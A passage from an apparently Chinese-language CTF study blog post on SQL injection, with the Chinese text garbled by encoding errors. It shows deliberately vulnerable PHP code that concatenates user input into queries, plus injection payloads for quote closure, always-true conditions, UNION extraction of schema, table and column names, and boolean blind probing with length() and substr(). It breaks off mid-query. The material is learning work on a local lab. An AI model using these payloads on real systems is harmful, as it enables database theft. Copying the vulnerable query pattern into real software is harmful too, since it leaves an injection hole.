è¿™é‡Œæœ‰å¤šç§é—­åˆæ–¹å¼ï¼Œæ¯”å¦‚:<code>$id</code>ï¼Œ<code>&#39;$id&#39;</code>ï¼Œ<code>â€œ$idâ€</code>ï¼Œ<code>($id)</code></p><p>ç„¶å<strong>æ„é€ é—­åˆ</strong>ï¼Œå…¶å®è¿™ä¸ªè¯æˆ‘ä¹Ÿä¸å¤ªæ‡‚ï¼Œçœ‹äº†ä¸€ä¸‹æ¢å§¬å¸ˆå‚…çš„ hello-ctf ä¸Šçš„è§£é‡Šï¼Œæ˜¯è¿™æ ·çš„ï¼š</p><p>æ¯”å¦‚åå°ä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$id</span>&quot;</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬ä½¿ä¼ å…¥çš„ <code>$id=&#39;1&quot;&#39;</code> ï¼Œåå°æ‰§è¡Œåˆ™ä¸º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;1&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œå¯¹ <code>1</code> å®Œæˆäº†é—­åˆæ„é€ ï¼Œä½†æ˜¯é—­åˆäº†å‰åºå¯¼è‡´åç»­çš„ <code>&quot;</code> æ²¡æœ‰åŒå¼•å·é…å¯¹ï¼Œå¤šå‡ºæ¥çš„è¿™ä¸ªåŒå¼•å·å°±ä¼šå¯¼è‡´æŠ¥é”™ï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1064 </span>- You have an <span class="hljs-keyword">error</span> in your SQL syntax; check the manual that corresponds <span class="hljs-keyword">to</span> your MySQL server version <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> use near <span class="hljs-comment">&#x27;&quot;&#x27; at line 1</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥é€šå¸¸åœ¨æ„é€ å®Œé—­åˆåå»æ³¨é‡Šæ‰åé¢çš„ç¬¦å·ï¼Œæ¯”å¦‚ä½¿ç”¨ <code>#</code>,<code>--</code></p><h3 id="æ˜¯å¦æŠ¥é”™åˆ¤æ–­"><a href="#æ˜¯å¦æŠ¥é”™åˆ¤æ–­" class="headerlink" title="æ˜¯å¦æŠ¥é”™åˆ¤æ–­"></a>æ˜¯å¦æŠ¥é”™åˆ¤æ–­</h3><p><code>&quot;1&#39;&quot;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1&#x27;&quot;</span><br>// <span class="hljs-string">&quot;&quot;</span> ä¸­ä¸ºå¯ä»¥åŒ…å« <span class="hljs-string">&#x27;,è€Œ 1&#x27;</span>æ˜¯ä¸€ä¸ªåˆæ³•å­—ç¬¦ä¸²ï¼Œåœ¨æŸ¥è¯¢æ—¶ä¼šå…ˆè¢«å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºæ•°å­—ï¼Œä¸ä¼šæŠ¥é”™<br></code></pre></td></tr></table></figure><p><code>1&#39;</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> uders <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">// å› ä¸ºè¿™é‡Œçš„&#x27;</span>æ²¡æœ‰é—­åˆï¼Œä¼šæŠ¥é”™<br></code></pre></td></tr></table></figure><p><code>&#39;1&#39;&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">// &#x27;</span>ä¸å‰é¢çš„<span class="hljs-string">&#x27;é—­åˆäº†,ä½†æ˜¯å‰©äº†ä¸€ä¸ª &#x27;</span>ï¼Œä¼šæŠ¥é”™<br></code></pre></td></tr></table></figure><h3 id="æŠ¥é”™ä¿¡æ¯åˆ¤æ–­"><a href="#æŠ¥é”™ä¿¡æ¯åˆ¤æ–­" class="headerlink" title="æŠ¥é”™ä¿¡æ¯åˆ¤æ–­"></a>æŠ¥é”™ä¿¡æ¯åˆ¤æ–­</h3><p><code>1&quot;</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">æ‰§è¡Œï¼šid = <span class="hljs-string">&quot;1&quot;</span><span class="hljs-comment">&quot;</span><br>æŠ¥é”™ï¼šnear <span class="hljs-string">&#x27;&quot;1&quot;&quot;&#x27;</span> at <span class="hljs-built_in">line</span> <span class="hljs-number">1</span><br>//å»æ‰å¤–å±‚ SQL çš„å•å¼•å·ï¼Œç•™ä¸‹ <span class="hljs-string">&quot;1&quot;</span><span class="hljs-comment">&quot;,å¯ä»¥åˆ¤æ–­å‡ºæ˜¯åŒå¼•å·çš„å­—ç¬¦å‹æ³¨å…¥</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL1.png"></p><p><code>1&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">æ‰§è¡Œï¼š<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">æŠ¥é”™ï¼šnear &#x27;</span>1<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; at line 1</span><br><span class="hljs-string">// å»æ‰å¤–å±‚ç•™ä¸‹ &#x27;</span>1<span class="hljs-string">&#x27;&#x27;</span>,å†é™¤å»æ³¨å…¥çš„ 1<span class="hljs-string">&#x27;,å¯ä»¥åˆ¤æ–­å‡ºæ˜¯å•å¼•å·çš„å­—ç¬¦å‹æ³¨å…¥</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL2.png"></p><p><code>&#39;1</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">æ‰§è¡Œï¼š<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;&#x27;</span>1<span class="hljs-string">&#x27;</span><br><span class="hljs-string">æŠ¥é”™ï¼šnear &#x27;</span><span class="hljs-string">&#x27;1&#x27;</span> at line 1<br>// å¯¹äº SQL,<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;&#x27;</span>å·²ç»é—­åˆï¼Œæ‰€ä»¥ 1<span class="hljs-string">&#x27; æˆä¸ºäº†æŠ¥é”™ç‚¹</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL3.png"></p><h2 id="æ•°å­—å‹æ³¨å…¥"><a href="#æ•°å­—å‹æ³¨å…¥" class="headerlink" title="æ•°å­—å‹æ³¨å…¥"></a>æ•°å­—å‹æ³¨å…¥</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select username from users where id=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>æ ¹æ®ç”¨æˆ·è¾“å…¥ idï¼ŒæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ã€‚ç”¨æˆ·çš„è¾“å…¥ id å­—æ®µï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤åœ°è¢«ç›´æ¥æ‹¼æ¥åœ¨äº† sql æŸ¥è¯¢è¯­å¥ä¸­ã€‚ç”±äº id æ²¡æœ‰è¢«å¼•ç”¨åŒ…è£¹ï¼Œè€Œä¸”ç±»å‹ä¸ºæ•°å­—ï¼Œæ­¤ä¸ºæ•°å­—å‹æ³¨å…¥ã€‚</p><p>å¯ä»¥ä½¿ç”¨åœ¨è¯­å¥ä¸­åŠ å…¥è¿ç®—ç¬¦æ¥æµ‹è¯•è¿™ç§æ³¨å…¥æ˜¯å¦å­˜åœ¨</p><p>sql å…³é”®å­— <strong>union</strong>ï¼Œå°†ä¸¤ä¸ª select è¯­å¥ç»“æœåˆå¹¶åˆ°ä¸€ä¸ªç»“æœé›†ä¸­ï¼Œä½†è¦æ±‚ä¸¤ä¸ª select è¯­å¥æ‹¥æœ‰ç›¸åŒçš„åˆ—æ•°ã€‚</p><p>ä½¿ç”¨è”åˆæŸ¥è¯¢ <code>union</code> åŸºäº <code>information_schema</code> æ‹¿åˆ°æ•°æ®åº“å</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL4.png"></p><p>ä»¥æŠŠ 1 æ¢æˆå…¶ä»–çš„ï¼Œæ¯”å¦‚ <code>database()</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL5.png"></p><p><strong>ç©ºæ ¼çš„ url ç¼–ç æ˜¯ %20</strong>ï¼Œå¦‚æœè¦æŸ¥è¯¢å…¶ä»–è¡Œï¼Œè¿˜éœ€è¦ä½¿ç”¨ **limit **å…³é”®å­—ã€‚</p><p>ä½¿ç”¨è”åˆæŸ¥è¯¢å»å¾—åˆ°æ•°æ®åº“çš„è¡¨åï¼Œå…ˆè·å–å½“å‰åº“ï¼ˆ<code>database()</code>ï¼‰</p><p>åŸºäº <code>UNION</code> <code>GROUP_CONCAT(table_name)</code> å’Œ <code>information_schema.tables</code> æŸ¥è¯¢</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL6.png"></p><p>è·å– è¡¨ çš„å¯¹åº”å­—æ®µå</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL7.png"></p><h2 id="å­—ç¬¦å‹æ³¨å…¥"><a href="#å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥"></a>å­—ç¬¦å‹æ³¨å…¥</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select id from users where username=&#x27;&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>é€šè¿‡ username æŸ¥è¯¢ idï¼Œè€Œä¸”ç”¨æˆ·è¾“å…¥çš„ username è¢«å•å¼•å·åŒ…è£¹èµ·æ¥äº†ã€‚æ‰€æœ‰ç”¨æˆ·çš„æ‰€æœ‰è¾“å…¥éƒ½ä¼šè¢«å½“æˆå­—ç¬¦ä¸²å¤„ç†ï¼Œæ— æ³•å°†ä¹‹å‰çš„æ•°å­—å‹æ³¨å…¥çš„ payload è¿›è¡Œæ³¨å…¥äº†ã€‚å¦‚æœè¾“å…¥ä¸­æœ‰ä¸€ä¸ªå¼•å·ï¼Œå°±å¯ä»¥å°†å‰é¢çš„å¼•å·é—­åˆï¼Œä½¿å¾—åé¢çš„å†…å®¹ä»å­—ç¬¦ä¸²ä¸­é€ƒé€¸å‡ºæ¥ã€‚æœ€åå°†åé¢çš„å¼•å·æ³¨é‡Šæ‰ã€‚</p><p><strong>é¦–å…ˆå°±éœ€è¦æ„é€ å•å¼•å·çš„é—­åˆ</strong></p><p>ä½¿ç”¨ä¸€ä¸ªå•å¼•å·å°†å­—ç¬¦ä¸²é—­åˆï¼Œåœ¨è¾“å…¥ sql è¯­å¥ï¼Œæœ€åç”¨ # å·å°†åé¢çš„å•å¼•å·æ³¨é‡Šæ‰ã€‚</p><p>æ¯”å¦‚ï¼š<strong>username &#x3D; â€˜or 1&#x3D;1 #</strong>,</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select id <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;&#x27;</span>or <span class="hljs-attribute">1</span>=1 #;<br></code></pre></td></tr></table></figure><p>åœ¨ where è¯­å¥ä¸­ï¼Œor è¿æ¥ä¸¤ä¸ªè¡¨è¾¾å¼ï¼Œç¬¬ä¸€ä¸ªè¿”å›å‡ç¬¬äºŒä¸ªè¿”å›çœŸï¼Œor æ“ä½œåè¿”å›çœŸï¼Œæ•´ä¸ªæ“ä½œè¿”å›æ‰€æœ‰çš„ç»“æœé›†ã€‚</p><p><code>username=-1â€™ or â€˜1â€™=â€˜1â€™ --</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> -- <span class="hljs-string">&#x27; and password = &#x27;</span>$<span class="hljs-keyword">password</span><span class="hljs-string">&#x27;;</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±ç›´æ¥å¯ä»¥ä½¿ <code>where</code> æ¡ä»¶ä¸º<strong>æ°¸çœŸ</strong>ï¼Œç›´æ¥è¾“å‡º <code>select * from user</code> çš„æ‰€æœ‰å†…å®¹</p><p><img src="/2024/11/06/TestWP/QL8.png"></p><p><code>order by</code> åˆ¤æ–­å‡½æ•°</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;//æŠ¥é”™</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL9.png"></p><p>åº“å</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.schemata;<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL10.png"></p><p>è¡¨å</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL11.png"></p><p>å­—æ®µå</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL12.png"></p><h1 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h1><p>é¡¾åæ€ä¹‰å°±æ˜¯æœåŠ¡å™¨ä¸æ˜¾ç¤ºæŸ¥è¯¢ç»“æœï¼Œåªè¿”å›æ˜¯å¦æŸ¥è¯¢æˆåŠŸæ—¶ï¼Œæ— æ³•ä½¿ç”¨ union ç›´æ¥å›æ˜¾æ•°æ®ï¼Œéœ€è¦ç›²æ³¨ã€‚ç›²æ³¨æœ‰æ—¶é—´ç›²æ³¨å’Œå¸ƒå°”ç›²æ³¨ã€‚</p><p>ä¾‹å¥</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">SELECT</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id = <span class="hljs-string">&quot;.$_GET[&quot;</span>id<span class="hljs-string">&quot;];</span><br></code></pre></td></tr></table></figure><p>æœ‰æ—¶å€™é˜²ç«å¢™æ‹¦æˆªè¿‡æ»¤äº† and ä½† or å¯èƒ½æ²¡æœ‰è¢«è¿‡æ»¤æ‹¦æˆªï¼Œé‚£å°±å¯ä»¥ç”¨ or æ¥è¿›è¡Œç›²æ³¨</p><h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p>æ¯”å¦‚ id ä¼ å‚æ˜¯</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œè¯­å¥ï¼š</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL13.png"></p><p>è¿™é‡Œè¦æ±‚ä¸¤ä¸ªæ¡ä»¶ä¸ºçœŸï¼Œä¸€æ˜¯æœ‰ <code>id=1</code>ï¼ŒäºŒæ˜¯ <code>1=1</code>ã€‚</p><p>å¦‚æœ è¾“å…¥<code>1=2</code>ï¼Œå¹¶ä¸ä¼šæœ‰å›æ˜¾ï¼Œè¿”å›ä¸ºç©ºï¼Œå› ä¸º <code>and</code> åé¢çš„æ¡ä»¶å¹¶ä¸æ»¡è¶³ã€‚</p><p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨æ­¤ç‰¹ç‚¹æ¥è·å–å…¶ä»–ä¿¡æ¯ï¼š</p><h3 id="length-è·å–é•¿åº¦ä¿¡æ¯"><a href="#length-è·å–é•¿åº¦ä¿¡æ¯" class="headerlink" title="length()è·å–é•¿åº¦ä¿¡æ¯"></a><strong><code>length()</code>è·å–é•¿åº¦ä¿¡æ¯</strong></h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username) <span class="hljs-operator">=</span> num<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ <code>length()</code> å‡½æ•°çˆ†ç ´æ•°æ®é•¿åº¦</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> usernameï¼Œ<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">length</span>(username) =<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ä½¿ç”¨äºŒåˆ†</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username)&lt; num<br><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username)&gt; num<br></code></pre></td></tr></table></figure><h3 id="SUBSTR-å‡½æ•°æˆªå–å­—ç¬¦ä¸²"><a href="#SUBSTR-å‡½æ•°æˆªå–å­—ç¬¦ä¸²" class="headerlink" title="SUBSTR()å‡½æ•°æˆªå–å­—ç¬¦ä¸²"></a><strong><code>SUBSTR()</code>å‡½æ•°æˆªå–å­—ç¬¦ä¸²</strong></h3><p><code>substr(string,start,length)</code> å‚æ•°ä¾æ¬¡ä¸ºï¼šè¦æˆªå–å­—ç¬¦ä¸²ï¼Œæˆªå–å¼€å§‹ä½ç½®ï¼Œæˆªå–é•¿åº¦ã€‚</p><p>æ¯”å¦‚æ³¨å…¥ admin çš„ passwordï¼Œæ„é€ è¿™æ ·çš„è¾“å…¥ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=&#x27;or substr(password,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;<span class="hljs-number">1</span>&#x27; #;<br></code></pre></td></tr></table></figure><p>å®é™… sql è¯­å¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> <span class="hljs-built_in">id</span> from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> username=<span class="hljs-string">&#x27;&#x27;</span> or 